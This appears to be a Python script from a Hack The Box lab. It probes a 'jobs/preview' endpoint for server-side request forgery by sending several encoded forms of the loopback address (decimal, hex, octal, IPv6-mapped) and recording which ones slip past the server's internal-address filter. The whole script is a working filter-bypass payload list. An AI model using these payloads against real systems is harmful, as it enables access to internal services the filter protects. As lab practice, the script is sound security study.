import subprocess

urls = [
    "http://2130706433/x.yaml",
    "http://0x7f000001/x.yaml",
    "http://0177.0.0.1/x.yaml",
    "http://[::ffff:127.0.0.1]/x.yaml",
    "http://127.1/x.yaml",
    "http://localhost/x.yaml",
]

for u in urls:
    r = subprocess.run(
        ["curl", "-s", "-X", "POST", "http://nimbus.htb/jobs/preview",
         "--data-urlencode", f"url={u}"],
        capture_output=True, text=True, timeout=20,
    )
    body = r.stdout
    if "Security policy" in body:
        verdict = "BLOCKED(internal)"
    elif "Fetched:" in body:
        verdict = "FETCHED"
    elif "must point" in body:
        verdict = "REJECTED(extension/format)"
    elif "YAML parse error" in body:
        verdict = "PARSE_ERROR(fetched but bad yaml)"
    else:
        verdict = "UNKNOWN"
    print(f"{u!r:55s} -> {verdict}")
